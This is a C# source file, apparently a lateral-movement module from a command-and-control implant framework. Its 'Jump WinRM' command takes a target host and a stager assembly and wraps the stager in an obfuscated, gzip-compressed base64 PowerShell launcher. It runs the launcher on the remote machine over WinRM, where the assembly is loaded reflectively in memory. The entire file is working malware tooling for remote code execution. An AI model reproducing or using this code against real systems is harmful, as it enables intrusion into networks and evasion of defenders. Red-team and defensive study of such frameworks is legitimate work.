using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Agent.Modules
{
    public class JumpModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        readonly string PowerShellTemplate = @"sv d ([System.Convert]::FromBase64String('{{COMPRESSED}}'));sv i (New-Object System.IO.MemoryStream(,(gv d).Value));sv o (New-Object System.IO.MemoryStream);sv g (New-Object System.IO.Compression.GzipStream (gv i).Value,([IO.Compression.CompressionMode]::Decompress));((gv g).Value).CopyTo((gv o).Value);[System.Reflection.Assembly]::Load(((gv o).Value).ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))";

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Jump",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "WinRM",
                        Delegate = JumpWinRM
                    }
                }
            };
        }

        void JumpWinRM(string AgentID, C2Data C2Data)
        {
            var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
            
            var target = (string)parameters.FirstOrDefault(p => p.Name.Equals("Target", StringComparison.OrdinalIgnoreCase)).Value;
            var stager = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase)).Value);

            var launcher = GenerateLauncher(stager);

            var uri = new Uri($"http://{target}:5985/WSMAN");
            var connection = new WSManConnectionInfo(uri);

            using (var runspace = RunspaceFactory.CreateRunspace(connection))
            {
                try
                {
                    runspace.Open();

                    using (var ps = PowerShell.Create())
                    {
                        ps.Runspace = runspace;
                        ps.AddScript(launcher);
                        ps.Invoke();
                    }
                }
                catch (Exception e)
                {
                    Agent.SendError(e.Message);
                }

                runspace.Close();
            }
        }

        string GenerateLauncher(byte[] payload)
        {
            var compressed = Convert.ToBase64String(Shared.Utilities.Utilities.Compress(payload));
            var launcher = PowerShellTemplate.Replace("{{COMPRESSED}}", compressed);
            return launcher;
        }
    }
}